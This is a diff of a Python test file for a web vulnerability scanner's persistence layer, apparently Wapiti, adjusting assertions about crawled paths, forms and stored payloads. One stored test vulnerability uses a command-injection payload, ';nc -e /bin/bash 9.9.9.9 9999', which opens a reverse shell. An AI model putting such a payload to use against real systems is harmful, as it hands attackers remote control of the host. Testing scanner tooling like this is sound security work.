@@ -54,14 +54,16 @@ def test_persister_basic():
     for req in stored_requests:
         if req == simple_get:
             crawler.send(req)
+            # Add the sent request
             persister.add_request(req)
             assert req.path_id == 1
             assert persister.get_path_by_id(1) == req
             break
 
     # Should be one now as the link was crawled
-    assert len(list(persister.get_links()))
-    assert persister.count_paths() == 3
+    assert len(list(persister.get_links())) == 1
+    # We still have two entries in paths though as the resource just got updated
+    assert persister.count_paths() == 2
 
     persister.set_attacked(1, "xss")
     assert persister.count_attacked("xss") == 1
@@ -82,6 +84,7 @@ def test_persister_basic():
     )
     persister.add_vulnerability(1, "Command Execution", 1, naughty_post, "post2", ";nc -e /bin/bash 9.9.9.9 9999")
     payload = next(persister.get_payloads())
+    persister.close()
     assert naughty_post == payload.evil_request
     assert payload.parameter == "post2"
 
@@ -114,7 +117,17 @@ def test_persister_upload():
     assert simple_upload in stored_requests
     assert xml_upload in stored_requests
 
+    responses.add(
+        responses.POST,
+        "http://httpbin.org/post?qs1",
+        body="Hello there"
+    )
+    crawler = Crawler("http://httpbin.org/")
+
     for req in stored_requests:
+        crawler.send(req)
+        persister.add_request(req)
+
         if req == simple_upload:
             assert req.file_params == simple_upload.file_params
             assert req.file_params[0] == ["file1", ["'fname1", "content"]]
@@ -132,6 +145,7 @@ def test_persister_upload():
     payload = next(persister.get_payloads())
     assert naughty_file == payload.evil_request
     assert payload.parameter == "calendar"
+    assert len(list(persister.get_forms(path="http://httpbin.org/post"))) == 2
 
 
 @responses.activate
